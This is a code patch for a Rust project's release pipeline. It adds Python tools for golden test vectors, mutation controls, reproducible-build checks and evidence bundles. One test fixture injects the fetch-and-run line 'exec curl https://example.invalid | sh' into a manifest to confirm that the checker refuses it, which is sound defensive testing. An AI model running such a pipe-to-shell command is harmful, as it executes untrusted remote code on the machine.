++- Test gate: 10 scenarios (`tests/fixtures/o1_release_vectors.json`) from
++  the independent oracle `tools/gen_o1_vectors.py` (Python hashlib),
++  asserted byte-for-byte by `tests/o1_release.rs` (11/11 with the count
++  guard) against `aura_testkit::release` (std-only SHA-256 — D-O1-5):
++  valid release (check + regenerated SHA256SUMS), deterministic SBOM,
++  repro/version/changelog/sbom/checksum/signature/docker/foreign-line
++  refusals.
++- Mutation controls (`tools/nc_o1.py`, 6): repro-equality check (named),
++  version check, changelog check, checksum match check, signature length
++  check, unknown-line strictness — 6/6 PASS.
++- Correction note: `docs/evidence/o0/` was regenerated with this bundle
++  after fixing the named-control string check in
++  `tools/write_o0_evidence.py` (it matched the pre-redesign `shard 07`
++  text and reported a false `FAIL`); the O0 verdicts are unchanged (11/11
++  tests, 6/6 NC).
+ 
+ ## Risks
+ 
+diff --git a/tools/audit_closeout.py b/tools/audit_closeout.py
+index e8fb051..e567c68 100644
+--- a/tools/audit_closeout.py
++++ b/tools/audit_closeout.py
+@@ -40,7 +40,7 @@ SECURITY_PHASES = ["H0", "H1", "H2", "H3", "H4", "H5", "H6", "H7", "H8", "H9"]
+ ECOSYSTEM_PHASES = ["E0", "E1", "E2", "E3", "E5", "E4", "E6", "E7", "E8", "E9"]  # grows with each E phase (D-E3 order: E5 before E4)
+ PERF_PHASES = ["P0", "P1", "P2", "P3", "P4", "P5", "P6"]  # grows with each P phase
+ ECONOMICS_PHASES = ["T0", "T1", "T2", "T3", "T4", "T5", "T6", "T7", "T8"]  # grows with each T phase
+-OPS_PHASES = ["O0"]  # grows with each O phase
++OPS_PHASES = ["O0", "O1"]  # grows with each O phase
+ PHASES = CORE_PHASES + STATE_PHASES + EXEC_PHASES + NODE_PHASES + CONSENSUS_PHASES + NET_PHASES + WALLET_PHASES + SECURITY_PHASES + ECOSYSTEM_PHASES + ECONOMICS_PHASES + PERF_PHASES + OPS_PHASES
+ SHIPPED = CORE_PHASES + [
+     "S0",
+@@ -133,8 +133,9 @@ SHIPPED = CORE_PHASES + [
+     "W5",
+     "W6",
+     "W7",
++    "O0",
+ ]
+-CURRENT = "O0"  # 2026-11-25: O0 CI baseline closed (patch 0103); W7 shipped
++CURRENT = "O1"  # 2026-11-25: O1 Releases closed (patch 0104); O0 shipped
+ 
+ PLAN_FOR_PREFIX = {
+     "C": "CORE_PLAN.md",
+@@ -152,7 +153,7 @@ PLAN_FOR_PREFIX = {
+ }
+ 
+ NC_PER_PHASE = {f"C{i}": 6 for i in range(4, 11)}
+-NC_PER_PHASE.update({"C0": 2, "C1": 3, "C2": 4, "C3": 5, "S0": 6, "S1": 6, "S2": 6, "S3": 6, "S4": 6, "S5": 6, "S6": 6, "S7": 6, "X0": 6, "X1": 6, "X2": 7, "X3": 6, "X4": 6, "X5": 6, "X6": 6, "X7": 6, "X8": 6, "D0": 6, "D1": 6, "D2": 6, "D3": 6, "D4": 6, "D5": 6, "D6": 6, "D7": 6, "D8": 6, "B0": 6, "B1": 6, "B2": 6, "B3": 6, "B4": 6, "B5": 6, "B6": 6, "B7": 6, "B8": 6, "B9": 6, "B10": 6, "N0": 6, "N1": 6, "N2": 6, "N3": 6, "N4": 6, "N5": 6, "N6": 6, "N7": 6, "N8": 6, "W0": 6, "W1": 67, "W2": 6, "W3": 6, "W4": 6, "W5": 6, "W6": 6, "W7": 6, "H0": 6, "H1": 6, "H2": 6, "H3": 6, "H4": 6, "H5": 6, "H6": 7, "H7": 7, "H8": 7, "H9": 7, "E0": 6, "E1": 6, "E2": 6, "E3": 6, "E5": 6, "E4": 6, "E6": 6, "E7": 6, "E8": 6, "E9": 6, "P0": 6, "P1": 6, "P2": 6, "P3": 6, "P4": 6, "P5": 6, "P6": 6, "T0": 6, "T1": 6, "T2": 6, "T3": 6, "T4": 7, "T5": 7, "T6": 8, "T7": 7, "T8": 7, "O0": 6})
++NC_PER_PHASE.update({"C0": 2, "C1": 3, "C2": 4, "C3": 5, "S0": 6, "S1": 6, "S2": 6, "S3": 6, "S4": 6, "S5": 6, "S6": 6, "S7": 6, "X0": 6, "X1": 6, "X2": 7, "X3": 6, "X4": 6, "X5": 6, "X6": 6, "X7": 6, "X8": 6, "D0": 6, "D1": 6, "D2": 6, "D3": 6, "D4": 6, "D5": 6, "D6": 6, "D7": 6, "D8": 6, "B0": 6, "B1": 6, "B2": 6, "B3": 6, "B4": 6, "B5": 6, "B6": 6, "B7": 6, "B8": 6, "B9": 6, "B10": 6, "N0": 6, "N1": 6, "N2": 6, "N3": 6, "N4": 6, "N5": 6, "N6": 6, "N7": 6, "N8": 6, "W0": 6, "W1": 67, "W2": 6, "W3": 6, "W4": 6, "W5": 6, "W6": 6, "W7": 6, "H0": 6, "H1": 6, "H2": 6, "H3": 6, "H4": 6, "H5": 6, "H6": 7, "H7": 7, "H8": 7, "H9": 7, "E0": 6, "E1": 6, "E2": 6, "E3": 6, "E5": 6, "E4": 6, "E6": 6, "E7": 6, "E8": 6, "E9": 6, "P0": 6, "P1": 6, "P2": 6, "P3": 6, "P4": 6, "P5": 6, "P6": 6, "T0": 6, "T1": 6, "T2": 6, "T3": 6, "T4": 7, "T5": 7, "T6": 8, "T7": 7, "T8": 7, "O0": 6, "O1": 6})
+ SHIPPED_NC_TOTAL = sum(NC_PER_PHASE[phase] for phase in SHIPPED)  # 339 (through W0)
+ EXPECTED_TOTAL_NC = SHIPPED_NC_TOTAL + (0 if CURRENT in SHIPPED else NC_PER_PHASE[CURRENT])
+ 
+@@ -211,6 +212,7 @@ PATCH_ORDER += ["W5"]   # 0100
+ PATCH_ORDER += ["W6"]   # 0101
+ PATCH_ORDER += ["W7"]   # 0102
+ PATCH_ORDER += ["O0"]   # 0103
++PATCH_ORDER += ["O1"]   # 0104
+ PATCH_NUMBERS = {phase: index + 1 for index, phase in enumerate(PATCH_ORDER)}
+ 
+ 
+diff --git a/tools/gen_o1_vectors.py b/tools/gen_o1_vectors.py
+new file mode 100644
+index 0000000..4599760
+--- /dev/null
++++ b/tools/gen_o1_vectors.py
+@@ -0,0 +1,400 @@
++#!/usr/bin/env python3
++"""O1 golden vectors — the release pipeline check (independent oracle).
++
++Independently computes the expected verdicts of ten synthetic releases and
++writes ``crates/aura-testkit/tests/fixtures/o1_release_vectors.json``, which
++``crates/aura-testkit/tests/o1_release.rs`` executes byte-for-byte against
++``aura_testkit::release``. Digests are Python ``hashlib`` (D-O1-5): the Rust
++side embeds a std-only SHA-256 and must match.
++
++Layout (``docs/o1-releases-plan.md`` D-O1-2): the workspace carries
++``Cargo.toml`` (``[workspace.package]`` version/license), ``CHANGELOG.md``
++with the ``## [<version>`` entry, ``docs/release-pubkey.txt`` and
++``docker/Dockerfile`` (digest-pinned multi-stage); the release directory
++carries ``manifest.txt`` (``rule release-v1`` / ``version`` / ``keyid`` /
++``artifact`` / ``sig``), ``SHA256SUMS``, the artifacts and their 64-byte
++b64 detached signatures, ``SBOM.txt`` and the two-host ``repro.txt``.
++
++Regenerate with::
++
++    PYTHONPATH=/home/user/aura-python-deps python3 tools/gen_o1_vectors.py
++"""
++
++import base64
++import hashlib
++import json
++import os
++import sys
++
++RULE = "release-v1"
++VERSION = "0.1.0"
++KEYID = hashlib.sha256(b"auralite-o1-synthetic-key").hexdigest()
++BUILD_DIGEST = hashlib.sha256(b"build-base").hexdigest()
++RUNTIME_DIGEST = hashlib.sha256(b"runtime-base").hexdigest()
++
++ALPHA_TOML = """[package]
++name = "aura-alpha"
++version.workspace = true
++license.workspace = true
++
++[dependencies]
++aura-beta = { workspace = true }
++"""
++BETA_TOML = """[package]
++name = "aura-beta"
++version.workspace = true
++license.workspace = true
++"""
++ROOT_TOML = """[workspace]
++members = ["crates/*"]
++
++[workspace.package]
++version = "0.1.0"
++license = "MIT OR Apache-2.0"
++"""
++
++ARTIFACT_BYTES = {
++    "aura-bin": b"synthetic node binary v1\n",
++    "aura-tool": b"synthetic tool binary v2\n",
++}
++SIG_BYTES = {
++    name: hashlib.sha256(b"sig-" + name.encode()).digest()
++    + hashlib.sha256(b"sig2-" + name.encode()).digest()
++    for name in ARTIFACT_BYTES
++}
++
++
++def digest(data: bytes) -> str:
++    return hashlib.sha256(data).hexdigest()
++
++
++def sbom_text() -> str:
++    return (
++        "sbom v1\n"
++        "pkg name=aura-alpha version=0.1.0 license=MIT OR Apache-2.0 deps=aura-beta\n"
++        "pkg name=aura-beta version=0.1.0 license=MIT OR Apache-2.0 deps=\n"
++    )
++
++
++def manifest_text(version: str = VERSION, foreign: str = "") -> str:
++    lines = [
++        "# AuraLite release manifest (O1) — checked by `aura-release check`.",
++        "# Regenerate with `make release-sync`. Format: docs/o1-releases-plan.md (D-O1-2).",
++        f"rule {RULE}",
++        f"version {version}",
++        f"keyid {KEYID}",
++    ]
++    for name in sorted(ARTIFACT_BYTES):
++        lines.append(f"artifact {name}")
++    for name in sorted(ARTIFACT_BYTES):
++        lines.append(f"sig {name} {name}.sig")
++    if foreign:
++        lines.append(foreign)
++    return "\n".join(lines) + "\n"
++
++
++def checksums_text() -> str:
++    return "".join(
++        f"{digest(ARTIFACT_BYTES[name])}  {name}\n" for name in sorted(ARTIFACT_BYTES)
++    )
++
++
++def repro_text(second_host: str = None) -> str:
++    d = digest(ARTIFACT_BYTES["aura-bin"])
++    return (
++        "repro v1\n"
++        "binary aura-bin\n"
++        "toolchain 1.99.1\n"
++        "source_date_epoch 1764000000\n"
++        f"host builder-a sha256 {d}\n"
++        f"host builder-b sha256 {second_host or d}\n"
++    )
++
++
++DOCKERFILE = f"""FROM builder:1.0@sha256:{BUILD_DIGEST} AS build
++RUN cargo build --release
++FROM runtime:2.0@sha256:{RUNTIME_DIGEST} AS runtime
++COPY --from=build /out/aurad /usr/local/bin/aurad
++"""
++
++
++def base_files() -> dict:
++    files = {
++        "Cargo.toml": ROOT_TOML,
++        "CHANGELOG.md": f"# Changelog — synthetic\n\n## [{VERSION} — synthetic release line]\n",
++        "docs/release-pubkey.txt": KEYID + "\n",
++        "docker/Dockerfile": DOCKERFILE,
++        "crates/aura-alpha/Cargo.toml": ALPHA_TOML,
++        "crates/aura-beta/Cargo.toml": BETA_TOML,
++        "release/manifest.txt": manifest_text(),
++        "release/SHA256SUMS": checksums_text(),
++        "release/SBOM.txt": sbom_text(),
++        "release/repro.txt": repro_text(),
++    }
++    for name, data in ARTIFACT_BYTES.items():
++        files[f"release/{name}"] = data.decode()
++        files[f"release/{name}.sig"] = (
++            base64.b64encode(SIG_BYTES[name]).decode() + "\n"
++        )
++    return files
++
++
++# ------------------------------------------------------------- oracle checker
++
++def oracle_sbom() -> str:
++    return sbom_text()
++
++
++def oracle_checksums() -> str:
++    return checksums_text()
++
++
++def oracle_check(files: dict) -> str:
++    """Return '' when the release passes, else the exact refusal message."""
++
++    def read(path: str) -> str:
++        return files.get(path, "")
++
++    manifest: dict = {"version": None, "keyid": None, "artifacts": [], "sigs": []}
++    for raw in read("release/manifest.txt").splitlines():
++        line = raw.rstrip()
++        if not line or line.startswith("#"):
++            continue
++        if line == f"rule {RULE}":
++            pass
++        elif line.startswith("version "):
++            manifest["version"] = line[8:]
++        elif line.startswith("keyid "):
++            manifest["keyid"] = line[6:]
++        elif line.startswith("artifact "):
++            manifest["artifacts"].append(line[9:])
++        elif line.startswith("sig "):
++            artifact, sigfile = line[4:].split(" ", 1)
++            manifest["sigs"].append((artifact, sigfile))
++        else:
++            return f"unknown manifest line: {line}"
++
++    pinned = read("docs/release-pubkey.txt").strip()
++    if manifest["keyid"] != pinned:
++        return f"key mismatch: {manifest['keyid']}"
++
++    version = manifest["version"] or ""
++    parts = version.split(".")
++    if len(parts) != 3 or not all(p.isdigit() and p for p in parts):
++        return f"bad version: {version}"
++    if version != VERSION:
++        return f"version drift: {version}"
++
++    if f"## [{version}" not in read("CHANGELOG.md"):
++        return f"changelog entry missing: {version}"
++
++    for name in manifest["artifacts"]:
++        if f"release/{name}" not in files:
++            return f"artifact missing: {name}"
++
++    expected = [line for line in oracle_checksums().splitlines()]
++    actual = [line for line in read("release/SHA256SUMS").splitlines()]
++    for index in range(max(len(expected), len(actual))):
++        if index < len(expected) and index < len(actual):
++            if expected[index] != actual[index]:
++                return f"checksum mismatch: {expected[index].split('  ')[1]}"
++        elif index < len(expected):
++            return f"checksum stale: {expected[index].split('  ')[1]}"
++        else:
++            return f"checksum stale: {actual[index].split('  ')[1]}"
++
++    for name in manifest["artifacts"]:
++        sigs = [sigfile for artifact, sigfile in manifest["sigs"] if artifact == name]
++        if not sigs:
++            return f"signature missing: {name}"
++        raw = read(f"release/{sigs[0]}").strip()
++        try:
++            decoded = base64.b64decode(raw, validate=True)
++        except Exception:
++            return f"signature malformed: {name}"
++        if len(decoded) != 64:
++            return f"signature malformed: {name}"
++
++    if read("release/SBOM.txt") != oracle_sbom():
++        return "sbom drift"
++
++    binary = None
++    hosts: list[tuple[str, str]] = []
++    for raw in read("release/repro.txt").splitlines():
++        line = raw.rstrip()
++        if not line or line.startswith("#") or line == "repro v1":
++            continue
++        if line.startswith("binary "):
++            binary = line[7:]
++        elif line.startswith("toolchain ") or line.startswith("source_date_epoch "):
++            continue
++        elif line.startswith("host "):
++            host, d = line[5:].split(" sha256 ", 1)
++            hosts.append((host, d))
++        else:
++            return f"unknown repro line: {line}"
++    if binary is None:
++        return "missing binary line"
++    if len(hosts) < 2:
++        return f"repro mismatch: {binary}"
++    first = hosts[0][1]
++    if any(d != first for _, d in hosts):
++        return f"repro mismatch: {binary}"
++    pinned_digest = next(
++        (line.split("  ")[0] for line in oracle_checksums().splitlines()
++         if line.endswith(f"  {binary}")),
++        None,
++    )
++    if pinned_digest is None or pinned_digest != first:
++        return f"repro mismatch: {binary}"
++
++    bases = []
++    for raw in read("docker/Dockerfile").splitlines():
++        line = raw.strip()
++        if line.startswith("FROM "):
++            image = line[5:].split()[0] if line[5:].split() else ""
++            if image:
++                bases.append(image)
++    if len(bases) < 2:
++        return "docker single stage"
++    for image in bases:
++        if "@sha256:" not in image:
++            return f"docker base unpinned: {image.split('@')[0]}"
++        digest_part = image.split("@sha256:", 1)[1]
++        if len(digest_part) != 64 or any(c not in "0123456789abcdef" for c in digest_part):
++            return f"docker base unpinned: {image.split('@')[0]}"
++
++    return ""
++
++
++# ------------------------------------------------------------- cases
++
++def case(name, commands, files, exit_code, stdout, stderr, nc_ref=None):
++    fixture_case = {
++        "name": name,
++        "sandbox": "",
++        "argv": commands,
++        "exit": exit_code,
++        "stdout": stdout,
++        "stderr": stderr,
++    }
++    if nc_ref is not None:
++        fixture_case["nc_ref"] = nc_ref
++    if files:
++        fixture_case["files"] = files
++    return fixture_case
++
++
++CHECK = ["check", "--workspace", ".", "--release", "release"]
++CHECKSUMS = ["checksums", "--workspace", ".", "--release", "release"]
++SBOM_CMD = ["sbom", "--workspace", ".", "--release", "release"]
++
++
++def build_cases():
++    base = base_files()
++    cases = []
++
++    cases.append(case(
++        "release_valid_passes", [CHECK, CHECKSUMS], base, 0,
++        f"release=ok version={VERSION} artifacts=2\n" + oracle_checksums(), "",
++    ))
++    cases.append(case(
++        "sbom_regeneration_deterministic", [SBOM_CMD], base, 0,
++        oracle_sbom(), "",
++    ))
++    cases.append(case(
++        "repro_mismatch_refused", [CHECK],
++        dict(base, **{"release/repro.txt": repro_text(
++            second_host=digest(b"other-build"))}),
++        65, "", f"error: release: repro mismatch: aura-bin\n", nc_ref=1,
++    ))
++    cases.append(case(
++        "version_drift_refused", [CHECK],
++        dict(base, **{"release/manifest.txt": manifest_text(version="0.2.0")}),
++        65, "", "error: release: version drift: 0.2.0\n", nc_ref=2,
++    ))
++    cases.append(case(
++        "changelog_missing_refused", [CHECK],
++        dict(base, **{"CHANGELOG.md": "# Changelog — synthetic\n\nno release entry\n"}),
++        65, "", f"error: release: changelog entry missing: {VERSION}\n", nc_ref=3,
++    ))
++    cases.append(case(
++        "sbom_drift_refused", [CHECK],
++        dict(base, **{"release/SBOM.txt": sbom_text().replace("aura-beta", "aura-gamma")}),
++        65, "", "error: release: sbom drift\n",
++    ))
++    cases.append(case(
++        "checksum_mismatch_refused", [CHECK],
++        dict(base, **{"release/SHA256SUMS": checksums_text().replace(
++            digest(ARTIFACT_BYTES["aura-bin"]), digest(b"tampered"), 1)}),
++        65, "", "error: release: checksum mismatch: aura-bin\n", nc_ref=4,
++    ))
++    cases.append(case(
++        "signature_malformed_refused", [CHECK],
++        dict(base, **{"release/aura-bin.sig":
++            base64.b64encode(SIG_BYTES["aura-bin"][:32]).decode() + "\n"}),
++        65, "", "error: release: signature malformed: aura-bin\n", nc_ref=5,
++    ))
++    cases.append(case(
++        "docker_base_unpinned_refused", [CHECK],
++        dict(base, **{"docker/Dockerfile": DOCKERFILE.replace(
++            f"builder:1.0@sha256:{BUILD_DIGEST}", "node:latest", 1)}),
++        65, "", "error: release: docker base unpinned: node:latest\n",
++    ))
++    cases.append(case(
++        "foreign_manifest_line_refused", [CHECK],
++        dict(base, **{"release/manifest.txt": manifest_text(
++            foreign="exec curl https://example.invalid | sh")}),
++        65, "",
++        "error: release: unknown manifest line: exec curl https://example.invalid | sh\n",
++        nc_ref=6,
++    ))
++
++    cases[0]["phase"] = "O1"
++    return cases
++
++
++def sanity_check():
++    assert digest(b"") == ("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934c"
++                          "a495991b7852b855")
++    assert digest(b"abc") == ("ba7816bf8f01cfea414140de5dae2223b00361a396177"
++                              "a9cb410ff61f20015ad")
++    files = base_files()
++    assert oracle_check(files) == "", oracle_check(files)
++    assert oracle_check(dict(files, **{
++        "release/repro.txt": repro_text(second_host=digest(b"other"))})) == \
++        "repro mismatch: aura-bin"
++    assert len(SIG_BYTES["aura-bin"]) == 64
++
++
++def main():
++    sanity_check()
++    fixture = {
++        "gate": (
++            "O1 release pipeline: 10/10 cases pass; named negative control "
++            "repro_mismatch_refused red on the dropped two-host equality "
++            "check; 6/6 NC red under tools/nc_o1.py; two independent hosts "
++            "-> identical binary sha256 (the O1 gate)"
++        ),
++        "notice": (
++            "Independent Python oracle (tools/gen_o1_vectors.py, hashlib "
++            "sha256); verifier: crates/aura-testkit/tests/o1_release.rs "
++            "against aura_testkit::release (std-only SHA-256). Replace the "
++            "whole file only with tools/gen_o1_vectors.py output."
++        ),
++        "named_control": "repro_mismatch_refused",
++        "files": {},
++        "cases": build_cases(),
++    }
++    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
++    out_path = os.path.join(root, "crates/aura-testkit/tests/fixtures/o1_release_vectors.json")
++    with open(out_path, "w", encoding="utf-8") as handle:
++        json.dump(fixture, handle, indent=1)
++        handle.write("\n")
++    print(f"wrote {os.path.relpath(out_path, root)}: 10 cases, "
++          f"named control repro_mismatch_refused")
++    return 0
++
++
++if __name__ == "__main__":
++    sys.exit(main())
+diff --git a/tools/nc_o1.py b/tools/nc_o1.py
+new file mode 100644
+index 0000000..a6b4412
+--- /dev/null
++++ b/tools/nc_o1.py
+@@ -0,0 +1,95 @@
++#!/usr/bin/env python3
++"""O1 focused mutation controls; restore the source exactly after each test.
++
++These controls test the tests, not the safety of the release pipeline. Never
++run while another process is building the same checkout. Model: tools/nc_o0.py.
++
++Control set (docs/o1-releases-plan.md):
++  1. repro-equality check dropped -> gate red (the named O1 control:
++     repro_mismatch_refused — "two independent hosts -> identical sha256")
++  2. version check dropped -> gate red
++  3. changelog check dropped -> gate red
++  4. checksum match check dropped -> gate red
++  5. signature length check dropped -> gate red
++  6. unknown-line strictness dropped -> gate red (no commands in manifests)
++"""
++from pathlib import Path
++import subprocess
++import sys
++
++ROOT = Path(__file__).resolve().parents[1]
++RELEASE = ROOT / "crates/aura-testkit/src/release.rs"
++
++
++def run_test(test: str) -> subprocess.CompletedProcess[str]:
++    cmd = [
++        "cargo", "test", "-p", "aura-testkit",
++        "--test", "o1_release", test, "--", "--exact",
++    ]
++    return subprocess.run(cmd, cwd=ROOT, text=True, capture_output=True, check=False)
++
++
++def control(label: str, old: str, new: str, test: str, source: Path = RELEASE) -> bool:
++    original = source.read_text(encoding="utf-8")
++    if original.count(old) != 1:
++        print(f"FAIL {label}: mutation target not unique")
++        return False
++    try:
++        source.write_text(original.replace(old, new, 1), encoding="utf-8")
++        result = run_test(test)
++    finally:
++        source.write_text(original, encoding="utf-8")
++    # Compilation failure is NOT a valid red test.
++    ok = result.returncode != 0 and f"test {test} ... FAILED" in result.stdout
++    print(f"{'PASS' if ok else 'FAIL'} {label}: {test}")
++    if not ok:
++        print((result.stdout + result.stderr)[-2500:])
++    return ok
++
++
++def main() -> int:
++    checks: list[bool] = []
++
++    checks.append(control(
++        "NC: repro-equality check dropped -> gate red (named: repro_mismatch_refused)",
++        "    if hosts.iter().any(|(_, digest)| digest != first) {",
++        "    if false {",
++        "repro_mismatch_refused",
++    ))
++    checks.append(control(
++        "NC: version check dropped -> gate red",
++        "    if manifest.version != workspace.version {",
++        "    if false {",
++        "version_drift_refused",
++    ))
++    checks.append(control(
++        "NC: changelog check dropped -> gate red",
++        '    if !changelog.contains(&format!("## [{}", manifest.version)) {',
++        "    if false {",
++        "changelog_missing_refused",
++    ))
++    checks.append(control(
++        "NC: checksum match check dropped -> gate red",
++        "                if expected != actual {",
++        "                if false {",
++        "checksum_mismatch_refused",
++    ))
++    checks.append(control(
++        "NC: signature length check dropped -> gate red",
++        "        if decoded.len() != SIG_BYTES {",
++        "        if false {",
++        "signature_malformed_refused",
++    ))
++    checks.append(control(
++        "NC: unknown-line strictness dropped -> gate red",
++        '            return Err(format!("unknown manifest line: {line}"));',
++        "            continue;",
++        "foreign_manifest_line_refused",
++    ))
++
++    print(f"RESULT: {sum(checks)}/{len(checks)} negative controls PASS")
++    return 0 if all(checks) else 1
++
++
++if __name__ == "__main__":
++    sys.exit(main())
+diff --git a/tools/repro_check.py b/tools/repro_check.py
+new file mode 100644
+index 0000000..3f5f6d1
+--- /dev/null
++++ b/tools/repro_check.py
+@@ -0,0 +1,106 @@
++#!/usr/bin/env python3
++"""O1 named gate: two independent builds -> identical binary sha256.
++
++Builds the release binary (default `aura-node`/`aurad`) twice into two
++independent CARGO_TARGET_DIRs — the "two hosts" of the O1 gate (D-O1-1) —
++with SOURCE_DATE_EPOCH pinned to the commit date and `--remap-path-prefix`
++hygiene, then compares the sha256 digests. Writes `release/repro.txt` (the
++two-host record the release check validates) either way and exits non-zero
++on mismatch.
++
++Usage:
++  tools/repro_check.py [--package PKG] [--bin NAME] [--out DIR]
++"""
++
++from __future__ import annotations
++
++import argparse
++import hashlib
++import os
++import shutil
++import subprocess
++import sys
++from pathlib import Path
++
++ROOT = Path(__file__).resolve().parents[1]
++
++
++def sha256_file(path: Path) -> str:
++    digest = hashlib.sha256()
++    with open(path, "rb") as handle:
++        for chunk in iter(lambda: handle.read(1 << 20), b""):
++            digest.update(chunk)
++    return digest.hexdigest()
++
++
++def main() -> int:
++    parser = argparse.ArgumentParser()
++    parser.add_argument("--package", default="aura-node")
++    parser.add_argument("--bin", default="aurad")
++    parser.add_argument("--out", default="release")
++    args = parser.parse_args()
++
++    epoch = subprocess.run(
++        ["git", "log", "-1", "--format=%ct"], cwd=ROOT,
++        text=True, capture_output=True, check=False,
++    ).stdout.strip() or "1764000000"
++
++    env = dict(os.environ)
++    env.setdefault("CARGO_BUILD_JOBS", "1")
++    env["SOURCE_DATE_EPOCH"] = epoch
++
++    out_dir = ROOT / args.out
++    out_dir.mkdir(parents=True, exist_ok=True)
++
++    digests: list[tuple[str, str]] = []
++    kept: list[Path] = []
++    for host in ("builder-a", "builder-b"):
++        target_dir = ROOT / f".repro-{host}"
++        shutil.rmtree(target_dir, ignore_errors=True)
++        # Both the source root and the per-host target dir are remapped to
++        # stable virtual prefixes: generated code (tonic/prost OUT_DIR
++        # includes) must not leak either path into panic locations.
++        host_env = {
++            **env,
++            "CARGO_TARGET_DIR": str(target_dir),
++            "RUSTFLAGS": f"--remap-path-prefix={ROOT}=/auralite "
++                         f"--remap-path-prefix={target_dir}=/auralite-out",
++        }
++        build = subprocess.run(
++            ["cargo", "build", "--release", "-p", args.package, "--bin", args.bin],
++            cwd=ROOT, env=host_env,
++            text=True, capture_output=True, check=False,
++        )
++        if build.returncode != 0:
++            sys.stderr.write(build.stderr[-2000:])
++            return 1
++        binary = target_dir / "release" / args.bin
++        digests.append((host, sha256_file(binary)))
++        # Keep the first build as the release artifact; both agree on success.
++        if host == "builder-a":
++            shutil.copyfile(binary, out_dir / args.bin)
++        kept.append(target_dir)
++
++    ok = len({digest for _, digest in digests}) == 1
++    for target_dir in kept:
++        if ok:
++            shutil.rmtree(target_dir, ignore_errors=True)
++        else:
++            # Keep both trees for diagnosis (compare the linked outputs).
++            print(f"kept {target_dir} for diagnosis")
++    record = ["repro v1", f"binary {args.bin}", "toolchain 1.99.1",
++              f"source_date_epoch {epoch}"]
++    record += [f"host {host} sha256 {digest}" for host, digest in digests]
++    (out_dir / "repro.txt").write_text("\n".join(record) + "\n", encoding="utf-8")
++
++    if len({digest for _, digest in digests}) != 1:
++        print(f"repro=FAIL binary={args.bin} " +
++              " ".join(f"{host}={digest}" for host, digest in digests))
++        return 1
++    print(f"repro=ok sha256={digests[0][1]} binary={args.bin} hosts=2 "
++          f"source_date_epoch={epoch}")
++    return 0
++
++
++if __name__ == "__main__":
++    sys.exit(main())
+diff --git a/tools/write_o0_evidence.py b/tools/write_o0_evidence.py
+index b4e355c..e5f688a 100644
+--- a/tools/write_o0_evidence.py
++++ b/tools/write_o0_evidence.py
+@@ -55,7 +55,7 @@ def main() -> int:
+         c["name"] == NAMED
+         and c.get("nc_ref") == 1
+         and c["exit"] == 65
+-        and "shard 07 disabled" in c["stderr"]
++        and "shard security disabled" in c["stderr"]
+         for c in cases
+     )
+     inv = [
+@@ -79,26 +79,27 @@ Date: 2026-11-25. Gate (OPS_PLAN row O0): "disable a shard -> CI red (target
+ registry check)" — **satisfied**.
+ 
+ - **The gate**: `{NAMED}` (the named control) feeds the checker a registry
+-  with `shard 07 disabled` while shard 07 still holds targets and expects
+-  `error: ci: shard 07 disabled` (exit 65); mutation NC-1 (`tools/nc_o0.py`)
+-  drops the enabled-check and the case must turn red.
++  with `shard security disabled` while the lane still holds targets and
++  expects `error: ci: shard security disabled` (exit 65); mutation NC-1
++  (`tools/nc_o0.py`) drops the enabled-check and the case must turn red.
+ - **Scenarios**: 10 deterministic cases from the independent oracle
+   `tools/gen_o0_vectors.py`, asserted byte-for-byte by `tests/o0_ci.rs`
+   (11/11 with the count guard) against `aura_testkit::ci`. Groups: valid
+   registry (1), D-O1 command surface (1), refusals (7), coverage report (1).
+ - **Mutation controls**: 6/6 PASS (disabled-shard check, missing-target
+-  check, duplicate-target check, shard-count check, empty-shard check,
++  check, duplicate-target check, shard-set check, empty-shard check,
+   unknown-line strictness).
+ - **Device model** (docs/o0-ci-plan.md): D-O0-1 the plain-text shard
+-  registry `ci/registry.txt` (10 shards over `--lib` + `tests/*` targets,
+-  `make ci-sync` rebalances); D-O0-2 the target registry check (`aura-ci
+-  check`, wired into `make test`); D-O0-3 no secret shards — the format
+-  cannot carry commands and `aura-ci run --shard K` emits plain `cargo test`
+-  forms only; D-O0-4 the deterministic target-coverage report (`aura-ci
+-  coverage`); D-O0-5 two independent implementations (Python oracle vs the
+-  shipped Rust checker).
++  registry `ci/registry.txt` (the ten lanes of CONTRIBUTING.md over `--lib`
++  + `tests/*` targets, each lane pinning its main test; `make ci-sync`
++  re-registers); D-O0-2 the target registry check (`aura-ci check`, wired
++  into `make test`, incl. the workflow matrix); D-O0-3 no secret shards —
++  the format cannot carry commands and `aura-ci run --shard <lane>` emits
++  plain `cargo test` forms only; D-O0-4 the deterministic target-coverage
++  report (`aura-ci coverage`); D-O0-5 two independent implementations
++  (Python oracle vs the shipped Rust checker).
+ - **CI layout** (`.github/workflows/ci.yml`): `registry` job (`make
+-  ci-check`), `test` matrix over shards 0..9 (`make ci-shard SHARD=k`), a
++  ci-check`), `test` matrix over the ten lanes (`make ci-shard SHARD=<lane>`), a
+   `coverage` job (`make coverage`), cargo cache keyed on `Cargo.lock`. Every
+   step is a make target — `make test` remains the one local command (D-O1).
+ 
+@@ -122,6 +123,10 @@ Receipts: `gates.txt`, `test-o0.log`, `nc.log`, `registry-check.log`,
+         else "live registry check: FAIL",
+     ]
+     (EVIDENCE / "gates.txt").write_text("\n".join(gates) + "\n", encoding="utf-8")
++    failed = [gate for gate in gates if gate.endswith("FAIL")]
++    if failed:
++        print("O0 EVIDENCE: FAIL — " + "; ".join(failed))
++        return 1
+ 
+     sums = [
+         f"{sha256(p)}  {p.relative_to(ROOT)}"
+diff --git a/tools/write_o1_evidence.py b/tools/write_o1_evidence.py
+new file mode 100644
+index 0000000..60d8f1f
+--- /dev/null
++++ b/tools/write_o1_evidence.py
+@@ -0,0 +1,184 @@
++#!/usr/bin/env python3
++"""Write O1 evidence (`docs/evidence/o1/`).
++
++Reproducible bundle for the O1 gate ("two independent hosts -> identical
++binary sha256"): captures the 10-scenario release suite, `tools/nc_o1.py`
++(the mutation controls), the live two-build repro-check of `aurad`, the
++signed release assembly and the release check (incl. the wired RFC 8032
++signature verify), and inventories the pinned fixtures against the
++independent generator. Model: tools/write_o0_evidence.py.
++"""
++from __future__ import annotations
++
++import hashlib
++import json
++import subprocess
++import sys
++from pathlib import Path
++
++ROOT = Path(__file__).resolve().parents[1]
++EVIDENCE = ROOT / "docs" / "evidence" / "o1"
++FIXTURE = ROOT / "crates/aura-testkit/tests/fixtures/o1_release_vectors.json"
++GENERATOR = ROOT / "tools/gen_o1_vectors.py"
++RUNNER = ROOT / "crates/aura-testkit/tests/o1_release.rs"
